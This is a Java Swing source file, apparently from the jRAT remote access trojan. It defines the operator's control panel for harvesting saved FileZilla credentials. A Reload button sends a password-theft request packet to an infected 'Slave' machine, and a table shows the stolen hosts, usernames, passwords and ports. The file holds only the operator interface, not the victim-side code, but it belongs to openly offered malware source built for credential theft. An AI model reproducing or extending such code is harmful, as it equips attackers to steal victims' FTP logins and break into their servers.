package io.jrat.client.ui.panels;

import io.jrat.client.Slave;
import io.jrat.client.packets.outgoing.Packet68FileZillaPassword;

import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;

import javax.swing.GroupLayout;
import javax.swing.GroupLayout.Alignment;
import javax.swing.ImageIcon;
import javax.swing.JButton;
import javax.swing.JLabel;
import javax.swing.JScrollPane;
import javax.swing.JTable;
import javax.swing.LayoutStyle.ComponentPlacement;
import javax.swing.ScrollPaneConstants;
import javax.swing.table.DefaultTableModel;


@SuppressWarnings("serial")
public class PanelControlFileZilla extends PanelControlParent {

	private JTable table;
	private DefaultTableModel model;

	public DefaultTableModel getModel() {
		return model;
	}

	public PanelControlFileZilla(Slave sl) {
		super(sl);

		JScrollPane scrollPane = new JScrollPane();
		scrollPane.setVerticalScrollBarPolicy(ScrollPaneConstants.VERTICAL_SCROLLBAR_ALWAYS);

		JButton btnReload = new JButton("Reload");
		btnReload.setIcon(new ImageIcon(PanelControlFileZilla.class.getResource("/icons/update.png")));
		btnReload.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				clear();
				slave.addToSendQueue(new Packet68FileZillaPassword());
			}
		});

		JButton btnClear = new JButton("Clear");
		btnClear.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				clear();
			}
		});
		btnClear.setIcon(new ImageIcon(PanelControlFileZilla.class.getResource("/icons/clear.png")));

		JLabel lblWillOnlyLoad = new JLabel("Will only load if passwords exists");
		GroupLayout groupLayout = new GroupLayout(this);
		groupLayout.setHorizontalGroup(groupLayout.createParallelGroup(Alignment.LEADING).addGroup(groupLayout.createSequentialGroup().addContainerGap().addGroup(groupLayout.createParallelGroup(Alignment.LEADING).addComponent(scrollPane, GroupLayout.PREFERRED_SIZE, 575, GroupLayout.PREFERRED_SIZE).addGroup(groupLayout.createSequentialGroup().addComponent(btnReload).addPreferredGap(ComponentPlacement.RELATED).addComponent(btnClear).addPreferredGap(ComponentPlacement.RELATED).addComponent(lblWillOnlyLoad))).addContainerGap(15, Short.MAX_VALUE)));
		groupLayout.setVerticalGroup(groupLayout.createParallelGroup(Alignment.LEADING).addGroup(groupLayout.createSequentialGroup().addContainerGap().addComponent(scrollPane, GroupLayout.PREFERRED_SIZE, 273, GroupLayout.PREFERRED_SIZE).addPreferredGap(ComponentPlacement.UNRELATED).addGroup(groupLayout.createParallelGroup(Alignment.BASELINE).addComponent(btnReload).addComponent(btnClear).addComponent(lblWillOnlyLoad)).addContainerGap(30, Short.MAX_VALUE)));

		table = new JTable();
		table.setModel(model = new DefaultTableModel(new Object[][] {}, new String[] { "Host", "User", "Pass", "Port" }));
		table.getColumnModel().getColumn(0).setPreferredWidth(157);
		table.getColumnModel().getColumn(1).setPreferredWidth(150);
		table.getColumnModel().getColumn(2).setPreferredWidth(199);
		table.getColumnModel().getColumn(3).setPreferredWidth(45);
		table.setRowHeight(25);
		scrollPane.setViewportView(table);
		setLayout(groupLayout);
	}

	public void clear() {
		while (model.getRowCount() > 0) {
			model.removeRow(0);
		}
	}
}
